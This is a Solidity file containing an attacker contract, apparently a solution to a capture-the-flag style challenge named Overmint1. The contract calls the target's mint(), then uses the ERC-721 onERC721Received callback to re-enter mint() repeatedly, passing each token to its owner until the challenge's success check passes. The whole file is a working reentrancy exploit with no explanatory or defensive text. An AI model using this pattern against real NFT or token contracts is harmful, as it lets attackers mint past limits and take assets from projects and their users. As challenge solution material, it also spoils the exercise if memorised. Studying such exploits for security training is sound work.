// SPDX-License-Identifier: No-License

pragma solidity 0.8.27;

interface IOvermint {
    function mint() external returns (uint16);

    function transferFrom(address from, address to, uint256 tokenId) external;

    function success(address _attacker) external view returns (bool);
}

interface IERC721Receiver {
    function onERC721Received(
        address operator,
        address from,
        uint256 tokenId,
        bytes calldata data
    ) external returns (bytes4);
}

contract Overmint1Attacker is IERC721Receiver {
    IOvermint private overmint;
    address private owner = msg.sender;

    constructor(address _overmint) {
        overmint = IOvermint(_overmint);
    }

    function attack() external {
        overmint.mint();
    }

    function onERC721Received(
        address operator,
        address from,
        uint256 tokenId,
        bytes calldata data
    ) external returns (bytes4) {
        overmint.transferFrom(address(this), owner, tokenId);
        if (!overmint.success(owner)) {
            overmint.mint();
        }
        return IERC721Receiver.onERC721Received.selector;
    }
}
